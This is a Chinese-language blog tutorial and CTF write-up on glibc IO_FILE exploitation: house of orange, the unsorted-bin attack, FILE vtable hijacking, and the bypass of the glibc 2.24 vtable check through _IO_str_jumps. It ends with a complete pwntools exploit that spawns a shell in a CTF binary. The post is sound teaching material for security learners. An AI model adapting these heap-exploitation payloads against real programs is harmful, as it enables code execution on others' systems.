# 新手向——IO_file全流程浅析

阅读量 **594752**

|评论 **8**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-12-29 14:30:26

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t018dde882dab82cd07.gif)

## 前言

_在当前CTF比赛中，“伪造IO_FILE”是pwn题里一种常见的利用方式，并且有时难度还不小。它的起源来自于Hitcon CTF 2016的[house
of
orange](https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more)，历经两年，这种类型题目不断改善，越改越复杂，但核心不变，理解io流在程序中的走向，就能很好的迎接挑战。然，网上虽资料不少，但是要么源码过多，对初学者很不友好，要么单提解题思路，令人云里雾里，疑惑百出。而这些让我催生出了这篇文章，若有不实不详之处，希望各位师傅指点。_

本文主要分为三个部分，首先简单介绍下“伪造IO_FILE”的攻击流程和思路，其次会利用几道ctf题目来详细讲解攻击原理，最后由glibc链接库近年的变化做一个总结。争取用最少的源码做最好的解释。

  * 攻击原理浅析

  * pwn题讲解

  * 总结

## 攻击原理浅析

在原始那道2016年的题目里，其实攻击手段由两部分组成，前用同名的堆利用house of
orange技术来突破没有free函数，后用伪造虚表的fsop技术来穿过多个函数来get shell。

###  什么是house of orange

> House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。  
>  这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入
> unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。

1.创建第一个chunk，修改top_chunk的size，破坏_int_malloc

    
    
    因为在sysmalloc中对这个值还要做校验， top_chunk的size也不是随意更改的：     
    
        （1）大于MINSIZE(一般为0X10)
        （2）小于接下来申请chunk的大小 + MINSIZE
        （3）prev inuse位设置为1
        （4）old_top + oldsize的值是页对齐的，即 (&old_top+old_size)&(0x1000-1) == 0
    

2.创建第二个chunk，触发sysmalloc中的_int_free

    
    
    就是如果申请大小>=mp_.mmap_threshold,就会mmap。我们只要申请不要过大，一般不会触发这个。
    

本文就不展开讲解house of orange技术，它的利用手段较简单，CTF Wiki上关于它的讲解也很详细。

![](https://p4.ssl.qhimg.com/t0198f62cc2362c3e2f.png)

[house of orange from
CTFWiki](http://static.zybuluo.com/shaobaobaoer/7arw5d9n5exc0hiei0ir0pux/2.png)

###  了解linux下常见的IO流

首先，要知道的是，linux环境下，文件结构体最全面的是 __IO_FILE_plus_ 结构体，所有的IO流结构都被它囊括其中。看它的一个定义引用：

    
    
    extern struct _IO_FILE_plus *_IO_list_all;
    

__IO_list_all_ 是一个 __IO_FILE_plus_
结构体定义的一个指针，它存在在符号表内，所以pwntools是可以搜索到的，接下来让我们看看结构体内部。

    
    
    struct _IO_FILE_plus
    {
      _IO_FILE file;
      const struct _IO_jump_t *vtable;
    };
    

结构体 __IO_FILE_plus_ ，它有两部分组成。

    
    
    在第一部分， *file* 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 *file* 结构在程序执行，*fread*、*fwrite* 等标准函数需要文件流指针来指引去调用虚表函数。
    特殊地， *fopen* 等函数时会进行创建，并分配在堆中。我们常定义一个指向 *file* 结构的指针来接收这个返回值。
    

尤其要注意得是， __IO_list_all_ 并不是一个描述文件的结构，而是它指向了一个可以描述文件的结构体头部，通常它指向
__IO_2_1_stderr__ 。

~~各种结构体一齐出现，一开始我没读源码，完全分不清~~

    
    
    struct _IO_FILE {
      int _flags; /* low-order is flags.*/
    #define _IO_file_flags _flags
    
      char* _IO_read_ptr;   /* Current read pointer */
      char* _IO_read_end;   /* End of get area. */
      char* _IO_read_base;  /* Start of putback+get area. */
      char* _IO_write_base; /* Start of put area. */
      char* _IO_write_ptr;  /* Current put pointer. */
      char* _IO_write_end;  /* End of put area. */
      char* _IO_buf_base;   /* Start of reserve area. */
      char* _IO_buf_end;    /* End of reserve area. */
    
      char *_IO_save_base; 
      char *_IO_backup_base; 
      char *_IO_save_end; 
      struct _IO_marker *_markers;
    
      struct _IO_FILE *_chain;/*指向下一个file结构*/
    
      int _fileno;
    #if 0
      int _blksize;
    #else
      int _flags2;
    #endif
      _IO_off_t _old_offset; 
    
    [...]
      _IO_lock_t *_lock;
      #ifdef _IO_USE_OLD_IO_FILE //开始宏判断（这段判断结果为否，所以没有定义_IO_FILE_complete，下面还是_IO_FILE）
    };
    
    struct _IO_FILE_complete
    {
      struct _IO_FILE _file;
    #endif //结束宏判断
    [...] 
    int _mode;
      /* Make sure we don't get into trouble again.  */
      char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
    #endif
    };
    

我把部分注释和源码去除，因为源码还是有些晦涩，并且不能很好体现结构体所占size，这部分反而pwndbg却很好调试。有些时候还是珍惜生命少看宏定义。
~~笑~~

    
    
    在第二部分，刚刚谈到的虚表就是 _IO_jump_t 结构体，在此虚表中，有很多函数都调用其中的子函数，无论是关闭文件，还是报错输出等等，都有对应的字段，而这正是可以攻击者可以被利用的突破口。
    值得注意的是，在 _IO_list_all 结构体中，_IO_FILE 结构是完整嵌入其中，而 vtable 是一个虚表指针，它指向了 _IO_jump_t 结构体。一个是完整的，一个是指针，这点一定要切记。
    
    
    
    struct _IO_jump_t
    {
        JUMP_FIELD(size_t, __dummy);
        JUMP_FIELD(size_t, __dummy2);
        JUMP_FIELD(_IO_finish_t, __finish);
        JUMP_FIELD(_IO_overflow_t, __overflow);
        JUMP_FIELD(_IO_underflow_t, __underflow);
        JUMP_FIELD(_IO_underflow_t, __uflow);
        JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
        /* showmany */
        JUMP_FIELD(_IO_xsputn_t, __xsputn);
        JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
        JUMP_FIELD(_IO_seekoff_t, __seekoff);
        JUMP_FIELD(_IO_seekpos_t, __seekpos);
        JUMP_FIELD(_IO_setbuf_t, __setbuf);
        JUMP_FIELD(_IO_sync_t, __sync);
        JUMP_FIELD(_IO_doallocate_t, __doallocate);
        JUMP_FIELD(_IO_read_t, __read);
        JUMP_FIELD(_IO_write_t, __write);
        JUMP_FIELD(_IO_seek_t, __seek);
        JUMP_FIELD(_IO_close_t, __close);
        JUMP_FIELD(_IO_stat_t, __stat);
        JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
        JUMP_FIELD(_IO_imbue_t, __imbue);
    #if 0
        get_column;
        set_column;
    #endif
    };
    

大师傅们肯定都能看懂了，但初学者可能读起来还是有点累，我放一张图来理解一下流程：

![](https://p4.ssl.qhimg.com/t017448d9547dc07159.png)

###  虚表劫持六步曲

先从流程图来看看你是否对过程都明白，如果还是对某些地方存在疑问，那就和我一起来探讨吧。

![](https://p1.ssl.qhimg.com/t017318af6577095810.png)

以上是攻击代码在系统内部的流转过程，总共要经历六步，而如何填充payload也是需要六步思考。

###  六步payload

能 _IO_file attack_ 最最基本的是，堆区要能溢出，并且此溢出距离还不能太短。

####  创造unsortedbin

    
    
    house of orange技术目的就是为了，把 old top_chunk 放进unsortedbin里。不过，如果程序能有free函数，第一步就自动达成了。
    

####  泄露地址

    
    
    不管怎么样，最早的 IO_file attack 必须泄露heap地址和libc地址，不然无法覆盖地址时确定各个函数的关系。不过，在 libc2.24 发布后，因为多了 vtable_check 函数而难以任意地址布置虚表，反而让人想出了新的利用说法，只用泄露libc地址即可，不知道算不算因祸得福。
    

####  篡改bk指针

这里利用的是 unsortedbin attack技术。 ~~注意不是unlink漏洞~~

从结果上来说，数据溢出至 unsortedbin 里chunk的bk指针，在此地址上填上 _IO_list_all-0x10 的地址就完事了。可为什么呢？

    
    
    while ((victim = unsorted_chunks(av)->bk) != unsorted_chunks(av)) {
                bck = victim->bk;
                [...]
                /* remove from unsorted list */
                unsorted_chunks(av)->bk = bck;
                bck->fd = unsorted_chunks(av);
                if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
        || __builtin_expect (victim->size > av->system_mem, 0))
      malloc_printerr (check_action, "malloc(): memory corruption",
                       chunk2mem (victim), av);//攻击开始函数
                }
    
    
    
    victim 指当前存在 unsortedbin 内chunk；
    bck 很明显是 _IO_list_all-0x10 的地址；
    unsorted_chunks(av) 是arena的top块，根据调试是 main_arena+88;
    

当程序再次执行时， _IO_list_all-0x10 地址赋值给 main_arena+88 的bk处，而把 main_arena+88 的地址赋值给
_IO_list_all-0x10 的fd处，即是 _IO_list_all，将其篡改到 arena 中，等到函数调用时，就会从
_IO_2_1_stderr_ 改变去 arena 里。

当然，因为fd指针在这里毫无用处，所以可以写入任意地址，但是它影响着unsortedbin链表的正确，如果之后还要利用bin，就要小心构造。

####  篡改freed chunk的头部

从结果上来说，数据溢出至 unsortedbin 里chunk的头部，在前地址上全填’x00’，后地址上填上0x61，也就完事了。可这也为什么呢？

    
    
    /* place chunk in bin */
        if (in_smallbin_range(size)) {
            victim_index = smallbin_index(size);
            bck = bin_at(av, victim_index);
            fwd = bck->fd;
        [...]
        victim->bk = bck;
        victim->fd = fwd;
        fwd->bk = victim;
        bck->fd = victim;
    

上述代码的大概含义是，检查了unsortedbin里的chunk不符合新申请的大小，就会按size大小放入smallbin或者largebin中。而我们伪造的size大小是0x61，就会放入smallbin的第六个链表里，同时把
victim 的地址赋值给链表头的bk处。此时，原chunk头（victim)的地址填写于 main_arena+88 的 0x60+0x18
的地址上，而file结构中的 __chain 指针也是位于结构中 0x78处。所以若是在 arena 里的file流要跳转，就会跳转到原chunk里。_

__*这里自认为是最精巧的攻击技术，无法控制arena里的所有数据，那就篡改可以控制的，再跳转到可控地址中__

    
    
    值得注意的是，由于之前把size设置为0x61，所以新申请无论什么size都会把这个chunk放进smallbin里。
    另外，smallbin和fastbin有互相覆盖的size大小，但是从unsortedbin里脱出时，只会掉进smallbin。
    

####  绕过fflush函数的检查

接下来要填充伪造的file结构里的数据了。原本是可以任意填充，但为了绕过fflush函数的检查，提供了两种填充方法。

    
    
    fp->_mode <= 0
    fp->_IO_write_ptr > fp->_IO_write_base
    或
    _IO_vtable_offset (fp) == 0（无法变动）
    fp->_mode > 0
    fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base
    (技巧：_wide_data指向 fp-0x10 的地址，因为fp的read_end > read_ptr（可观察下文调试））
    

部分 _IO_wide_data 结构体源码，来理解伪造的原理

    
    
    struct _IO_wide_data
    {
      wchar_t *_IO_read_ptr;    
      wchar_t *_IO_read_end;
      wchar_t *_IO_read_base;//注意wchar和char的区别
      wchar_t *_IO_write_base;//small
      wchar_t *_IO_write_ptr;//big    
      wchar_t *_IO_write_end;    
      wchar_t *_IO_buf_base;    
      wchar_t *_IO_buf_end;    
      [...]
    };
    

所有的变量在file结构源码里都有其位置地址，就不详细写偏移了。

由于逻辑短路原则，想要调用后面的_IO_OVERFLOW (fp, EOF)，前面的条件只要满足其一就可以了。

之外，这段函数代码中也解释了为什么构造了0x61后，文件流会跳转的原因。

    
    
    _IO_flush_all_lockp (int do_lock)
    {
    [...]
      last_stamp = _IO_list_all_stamp;//第一个一定相等，所以跳转
      fp = (_IO_FILE *) _IO_list_all; 
      while (fp != NULL)
        {
    [...]
          if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)//bypass或一条件
    #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
           || (_IO_vtable_offset (fp) == 0
               && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                        > fp->_wide_data->_IO_write_base))//bypass或二条件
    #endif
           )
          && _IO_OVERFLOW (fp, EOF) == EOF)//改 _IO_OVERFLOW 为 自填充地址函数来劫持程序流
        [...]
          if (last_stamp != _IO_list_all_stamp)
        {
          fp = (_IO_FILE *) _IO_list_all;
          last_stamp = _IO_list_all_stamp;
        }
          else
        fp = fp->_chain;//指向下一个fp（从main_arena到heap）
        }
    [...]
    }
    

####  虚表函数的位置

首先，file结构的 *vtable 指针要填写伪造虚表的地址，这需要精确计算这也是为什么需要heap地址的原因。

其次，虚表的结构源码上文描述过，简单的做法就是，除了前两个填写0x0值外，其余都填写要想跳转的地址。

下面是一张完整的攻击流程图：

![](https://p4.ssl.qhimg.com/t01b54b51a896518067.png)

###  glibc2.24下的利用手段

> 在新版本的 glibc 中 (2.24)，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc
> 会在调用虚函数之前首先检查 vtable 地址的合法性。  
>  如果 vtable 是非法的，那么会引发 abort。  
>  首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用_IO_vtable_check 做进一步检查。  
>  这里的检查使得以往使用 vtable 进行利用的技术很难实现

好，那我们先观察一下，新的check函数：

    
    
    static inline const struct _IO_jump_t *
    IO_validate_vtable (const struct _IO_jump_t *vtable)
    {
      uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
      const char *ptr = (const char *) vtable;
      uintptr_t offset = ptr - __start___libc_IO_vtables;
      if (__glibc_unlikely (offset >= section_length))
        _IO_vtable_check ();//引发报错的函数
      return vtable;
    }
    

由于 vtable 必须要满足 在 **stop_** libc_IO_vtables 和 **start_**
libc_IO_vtables之间，而我们上文伪造的vtable不满足这个条件。

然而攻击者找到了 **IO_str_jumps 和** IO_wstr_jumps 这两个结构体 可以绕过check。其中，因为利用
**IO_str_jumps 绕过更简单，本文着重介绍它，** IO_wstr_jumps与其大同小异。

观察

    
    
    const struct _IO_jump_t _IO_str_jumps libio_vtable =
    {
      JUMP_INIT_DUMMY,//调试发现占0x10
      JUMP_INIT(finish, _IO_str_finish),
      JUMP_INIT(overflow, _IO_str_overflow),
      JUMP_INIT(underflow, _IO_str_underflow),
      JUMP_INIT(uflow, _IO_default_uflow),
    [...]
    };
    

其中其中 _IO_str_finsh 和 _IO_str_overflow 可以拿来利用.相对来说，函数 _IO_str_finish
的绕过和利用条件更简单直接，该函数定义如下：

    
    
    void _IO_str_finish (FILE *fp, int dummy)
    {
      if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
        (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);  //call qword ptr [fp+0E8h]
      fp->_IO_buf_base = NULL;
      _IO_default_finish (fp, 0);
    }
    

所以，在原来的基础上增加的是：

    
    
    fp->_flags = 0
    vtable = _IO_str_jumps - 0x8
    //这样调用_IO_overflow时会调用到 _IO_str_finish
    fp->_IO_buf_base = /bin/sh_addr
    fp+0xe8 = system_addr
    

同时，不用再伪造虚表，所以就可以不用泄露heap地址了。

而 _IO_str_overflow 会稍微复杂一些，该函数定义如下：

    
    
    int _IO_str_overflow (_IO_FILE *fp, int c)
    {
    [...]
        {
          if (fp->_flags & _IO_USER_BUF) // not allowed 
        return EOF;
          else
        {
          char *new_buf;
          char *old_buf = fp->_IO_buf_base;
          size_t old_blen = _IO_blen (fp);
          _IO_size_t new_size = 2 * old_blen + 100;                
          if (new_size < old_blen)
            return EOF;
          new_buf
            = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
        [...]
    }
    

所以，它在原来的基础上增加的是：

    
    
    fp->_flags = 0
    fp->_IO_buf_base = 0
    fp->_IO_buf_end = (bin_sh_addr - 100) / 2
    fp->_IO_buf_base = /bin/sh_addr
    fp+0xe8 = system_addr
    

其实这份源码我读的时候，有个疑问：

fp->_s._free_buffer 和 fp->_s._allocate_buffer
到底是指向了偏移多少的地址，网上找到的一个答案说用IDA看，尴尬的是IDA里显示的是0xe0，这明显不对。还是简单点，动态调试一下就可以了。

    
    
    其实，_IO_vtable_check 函数也不会立刻报错，里面还会检查 dl_open_hook 等函数来检测是否是外来的文件流，从而取消报错，而这里又是一个可以利用的点。~~emmm再补这篇文章可能太冗长了，下次写~~
    

###  最后的一点注意

可以注意到，IO_file attack
的利用并不是百分百成功。凡事都有原因，我也想知道，但网上也搜索不到知识。最后感谢holing师傅，他帮我解决了这个疑问：

    
    
    必须要libc的低32位地址为负时，攻击才会成功。
    

噢，原来原因还是出在fflush函数的检查里，它第二步才是跳转，第一步的检查，在arena里的伪造file结构中这两个值，绝对值一定可以通过，那么就会直接执行虚表函数。所以只有为负时，才会check失效。再次感谢holing师傅。

最后，你会发现我虽然分了六步，但其实每一步都是紧紧相扣，如果到这里你已经忘了之前在讲什么，不妨看看下面这道pwn题，或许有新的体会。

## pwn题讲解

这里采用的安恒2018.10的level1题，网上好像也没有wp，我就心安理得地开始讲解。

凡事都从打开IDA开始

![](https://p1.ssl.qhimg.com/t014dcd46b366b85c71.png)

可以看出程序只有create函数和show函数，典型的要使用house of orange技术，再配上点IO_file attack技术。

![](https://p1.ssl.qhimg.com/t01032d61c34e922b54.png)

观察show（）函数，发现printf函数有格式化漏洞，但是由于read函数输入时有截断，导致无法使用unsortedbin里的数据来泄露。偏移泄露时，观察到栈上只有libc里的地址，因只能泄露libc地址，考虑到使用2.24版本的攻击模式。

![](https://p3.ssl.qhimg.com/t0139d33c47c93198ee.png)

我使用house of orange技术时，直接抄取原本top_chunk的后三位。

![](https://p4.ssl.qhimg.com/t01965b2b04d2b39f4e.png)

数据填充完成后，可以发现gdb里已经对freed chunk无法识别。

![](https://p4.ssl.qhimg.com/t01f2127f713da365f1.png)

接着申请新chunk报错时，观察数据变化和上文是否一致。

_IO_list_all
里储存的是main_arena+88的地址，而main_arena+88+0x18也储存着_IO_list_all-0x10的地址。

![](https://p3.ssl.qhimg.com/t01e8102392994325ba.png)

可以清楚观察到，arena里的伪造file结构的 *chain 确实指向了heap区伪造的chunk头。而它
的绝对值比较上，确实可以成功判断，从而有失败的可能。

![](https://p2.ssl.qhimg.com/t01e6c53f65fdfdb6fe.png)

回到heap区，发现部分数据已经改变，若是采用第二种办法，_wide_data 指向fp-0x10地址后，判断也能成功。

![](https://p5.ssl.qhimg.com/t01567c45b0b9bec372.png)

最后，当libc低32位小于0x80000000（为正）时，就会攻击失败。

![](https://p3.ssl.qhimg.com/t01132cdeaffa9d2d42.png)

最后放上exp：

    
    
    from pwn import *
    
    p = process('./level1')
    
    def create(size,stri):
        p.recvuntil('exitn')
        p.sendline('1')
        p.recvuntil('size: ')
        p.sendline(str(size))
        p.recvuntil('string: ')
        p.sendline(stri)
    
    def show():
        p.recvuntil('exitn')
        p.sendline('2')
        p.recvuntil('result: ')
        resp = p.recv(14)
        return resp
    
    
    create(0x10,'%2$p')
    libc = eval(show()[:14])-0x3c6780
    log.info('libc: '+hex(libc))
    
    sys = libc + 0x45390
    sh = libc + 0x18cd57
    one = libc + 0x45216
    _IO_list_all = libc + 0x3c5520
    #
    
    create(0x10,'%8$p.%p.%p.%p.%p.%p.%p')
    start = eval(show()[:14])-0x9b0
    log.info('start: '+hex(start))
    
    payload = 'a'*0x18+p64(0xfa1)
    create(0x10,payload)
    #gdb.attach(p)
    create(0x1000,'a')
    
    #unsortedbin
    
    pay='e'*0x100
    fake_file=p64(0)+p64(0x61) #fp ; to smallbin 0x60 (_chain)
    fake_file+=p64(libc)+p64(_IO_list_all-0x10) #unsortedbin attack
    fake_file+=p64(1)+p64(2) #_IO_write_base ; _IO_write_ptr
    fake_file+=p64(0)+p64(sh)#_IO_buf_base=sh_addr
    fake_file=fake_file.ljust(0xd8,'x00') #mode<=0
    fake_file+=p64(libc+0x3c37a0-8)#vtable=_IO_str_jump-8
    fake_file+=p64(0)
    fake_file+=p64(sys)#fp+0xe8=sys_addr
    pay+=fake_file
    
    create(0x100,pay)
    #if the lower 32 of libc is more than 0x80000000,attack is success
    
    #gdb.attach(p)
    p.recvuntil('exitn')
    p.sendline('1')
    p.recvuntil('size: ')
    p.sendline('0x20')
    
    p.interactive()
    

## 总结

> 来自 glibc 的 master 分支上的今年4月份的一次 commit，不出意外应该会出现在 libc-2.28 中。  
>  该方法简单粗暴，用操作堆的 malloc 和 free 替换掉原来在 _IO_str_fields 里的 _allocate_buffer  
>  和 _free_buffer。由于不再使用偏移，就不能再利用 __libc_IO_vtables 上的 vtable  
>  绕过检查，于是上面的利用技术就都失效了。

![](https://p0.ssl.qhimg.com/t01e8528e095b25d09d.png)

年关将至，现在正是今年的最后日子，刚刚掌握并整理了这份文档，我才发现开发者们已经比我快上近一年。而这种复杂又梦幻的攻击方法，在现实环境下却要用其他方法来辅助实现。但无论如何，通过这次学习，我学会了如何读源码，如何询问他人，成功总是要先学会失败。

## 参考资料

(1).<https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more>

(2).<https://ctf-wiki.github.io/ctf-wiki/pwn/readme/>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **叶落** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/168802](/post/id/168802)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [glibc](/tag/glibc)
  * [IO](/tag/IO)

 **+1** __16赞

 __收藏

![](https://p0.ssl.qhimg.com/t015d32be159280aed2.png) 叶落

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

